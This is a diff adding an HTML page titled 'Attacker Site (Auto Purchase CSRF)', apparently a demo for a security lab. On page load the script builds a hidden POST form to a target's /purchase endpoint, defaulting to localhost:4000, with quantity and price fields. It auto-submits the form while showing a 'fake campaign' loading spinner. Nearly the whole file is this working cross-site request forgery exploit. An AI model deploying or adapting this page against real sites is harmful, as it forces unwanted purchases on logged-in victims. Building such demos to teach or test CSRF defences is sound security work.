@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Attacker Site (Auto Purchase CSRF)</title>
+    <style>
+      :root { color-scheme: light; }
+      body {
+        font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+        margin: 0;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: radial-gradient(circle at 20% 20%, #fff5e6, #fff);
+        color: #2f2217;
+      }
+      .loader-card {
+        width: 360px;
+        padding: 28px;
+        border-radius: 16px;
+        background: #ffffff;
+        box-shadow: 0 15px 50px rgba(0,0,0,0.12);
+        text-align: center;
+      }
+      .spinner {
+        width: 48px;
+        height: 48px;
+        border: 6px solid #ffe2c2;
+        border-top-color: #d05c00;
+        border-radius: 50%;
+        margin: 0 auto 16px;
+        animation: spin 1s linear infinite;
+      }
+      .title { font-size: 18px; font-weight: 700; margin: 0 0 6px; }
+      .muted { color: #6b5a49; font-size: 14px; margin: 0; }
+      code { background: #fff3e3; padding: 2px 6px; border-radius: 6px; }
+      @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+  </head>
+  <body>
+    <div class="loader-card">
+      <div class="spinner" aria-hidden="true"></div>
+      <p class="title" id="statusMain">読み込み中...</p>
+      <p class="muted" id="statusText">ターゲット: <code id="targetBase"></code></p>
+      <p class="muted" style="margin-top: 10px;">
+        自動送信デモです。1秒後に購入リクエストを送信します。
+      </p>
+    </div>
+
+    <script>
+      const TARGET_BASE = window.__TARGET_BASE__ || "http://localhost:4000";
+      document.getElementById("targetBase").textContent = TARGET_BASE;
+
+      function buildPayload() {
+        return {
+          product_id: 1,
+          quantity: 3,
+          unit_price_yen: 1000000,
+          total_yen: 3000000,
+          note: "CSRF auto purchase from attacker site"
+        };
+      }
+
+      function createForm(targetBase) {
+        const form = document.createElement("form");
+        form.method = "POST";
+        // top-level navigationで送信し、購入完了ページへ遷移させる
+        form.action = new URL("/purchase", targetBase).toString();
+        form.target = "_self";
+
+        Object.entries(buildPayload()).forEach(([name, value]) => {
+          const input = document.createElement("input");
+          input.type = "hidden";
+          input.name = name;
+          input.value = value;
+          form.appendChild(input);
+        });
+
+        document.body.appendChild(form);
+        return form;
+      }
+
+      function autoSubmitPurchase() {
+        const statusMain = document.getElementById("statusMain");
+        const status = document.getElementById("statusText");
+        statusMain.textContent = "偽キャンペーン処理中…";
+        const form = createForm(TARGET_BASE);
+        setTimeout(() => {
+          statusMain.textContent = "購入リクエストを送信しています...";
+          status.textContent = "ターゲット: " + TARGET_BASE;
+          form.submit();
+        }, 500);
+      }
+
+      window.addEventListener("load", () => {
+        autoSubmitPurchase();
+      });
+    </script>
+  </body>
+</html>
